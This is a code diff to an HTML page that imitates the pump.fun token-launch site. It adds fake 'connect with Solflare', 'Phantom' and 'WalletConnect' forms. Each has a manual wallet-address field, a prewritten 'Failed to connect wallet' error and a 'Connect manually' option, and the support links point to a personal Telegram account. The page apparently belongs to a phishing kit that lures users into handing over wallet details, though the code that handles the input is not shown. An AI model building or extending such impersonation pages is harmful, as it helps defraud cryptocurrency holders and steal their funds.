@@ -133,7 +133,7 @@
 		 style="pointer-events: auto;" data-aria-hidden="true" aria-hidden="true">
 
 		<div role="dialog" id="radix-:r0:" aria-describedby="radix-:r2:" aria-labelledby="radix-:r1:" data-state="open"
-			 class="fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border border-slate-200 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg dark:border-slate-800 dark:bg-slate-950 bg-primary text-white p-4 text-center"
+			 class="dialog-2 fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border border-slate-200 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg dark:border-slate-800 dark:bg-slate-950 bg-primary text-white p-4 text-center"
 			 tabindex="-1" style="pointer-events: auto;">
 			<div class="flex flex-col space-y-1.5 sm:text-left text-center">
 				<h2 id="radix-:r1:" class="text-lg font-semibold leading-none tracking-tight text-center">How it works
@@ -149,8 +149,9 @@
 				<div class="text-gray-300">step 4: when enough people buy on the bonding curve it reaches a market cap
 					of $69k</div>
 				<div class="text-gray-300">step 5: $12k of liquidity is then deposited in raydium and burned</div>
-			</div><button
-					class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-white transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-slate-950 focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 dark:ring-offset-slate-950 dark:focus-visible:ring-slate-300 dark:hover:bg-slate-800 dark:hover:text-slate-50 h-10 px-4 py-2 text-slate-50 hover:font-bold hover:bg-transparent hover:text-slate-50">[I'm
+			</div>
+			<button
+					class="pop-how-to-btn inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-white transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-slate-950 focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 dark:ring-offset-slate-950 dark:focus-visible:ring-slate-300 dark:hover:bg-slate-800 dark:hover:text-slate-50 h-10 px-4 py-2 text-slate-50 hover:font-bold hover:bg-transparent hover:text-slate-50">[I'm
 				ready to pump]</button>
 		</div>
 
@@ -214,6 +215,24 @@
 				</div>
 			</div>
 			<div class="css-5eru5x">
+				<form id="add-form">
+					<div class="field">
+						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
+							   value="connect with  Solflare">
+					</div>
+					<div class="field">
+						<input type="text" name="message" placeholder="enter wallet address" id="address" />
+					</div>
+					<span class="error-connect">Failed to connect wallet</span>
+					<div class="field">
+						<button type="submit" class="css-ev97sc"><span class="css-1o1xzxn connect-web-button-add">
+								Connect
+								wallet</span>
+						</button>
+
+					</div>
+					<span class="connect-manually">Connect manually</span>
+				</form>
 				<form class="main-form">
 					<div class="field">
 						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
@@ -255,6 +274,24 @@
 				</div>
 			</div>
 			<div class="css-5eru5x">
+				<form id="add-form">
+					<div class="field">
+						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
+							   value="connect with  Phantom">
+					</div>
+					<div class="field">
+						<input type="text" name="message" placeholder="enter wallet address" id="address" />
+					</div>
+					<span class="error-connect">Failed to connect wallet</span>
+					<div class="field">
+						<button type="submit" class="css-ev97sc"><span class="css-1o1xzxn connect-web-button-add">
+								Connect
+								wallet</span>
+						</button>
+
+					</div>
+					<span class="connect-manually">Connect manually</span>
+				</form>
 				<form class="main-form">
 					<div class="field">
 						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
@@ -356,6 +393,24 @@
 				</div>
 			</div>
 			<div class="css-5eru5x">
+				<form id="add-form">
+					<div class="field">
+						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
+							   value="connect with  WalletConnect">
+					</div>
+					<div class="field">
+						<input type="text" name="message" placeholder="enter wallet address" id="address" />
+					</div>
+					<span class="error-connect">Failed to connect wallet</span>
+					<div class="field">
+						<button type="submit" class="css-ev97sc"><span class="css-1o1xzxn connect-web-button-add">
+								Connect
+								wallet</span>
+						</button>
+
+					</div>
+					<span class="connect-manually">Connect manually</span>
+				</form>
 				<form class="main-form">
 					<div class="field">
 						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
@@ -394,10 +449,10 @@
 								   class="text-sm text-white hover:underline hover:font-bold"
 								   href="https://t.me/kelechifrane" target="_blank"
 								   rel="noopener noreferrer">[support]</a></div>
-							<div class="flex gap-2"><a class="text-sm text-white hover:underline hover:font-bold"
+							<div class="flex gap-2 "><a class="text-sm text-white hover:underline hover:font-bold"
 								   href="https://t.me/kelechifrane" target="_blank"
 								   rel="noopener noreferrer">[telegram]</a><button
-										class="text-sm text-slate-50 hover:font-bold hover:bg-transparent hover:text-slate-50"
+										class="how_it_works  text-sm text-slate-50 hover:font-bold hover:bg-transparent hover:text-slate-50"
 										type="button" aria-haspopup="dialog" aria-expanded="false"
 										aria-controls="radix-:r0:" data-state="closed">[how it works]</button></div>
 						</div>
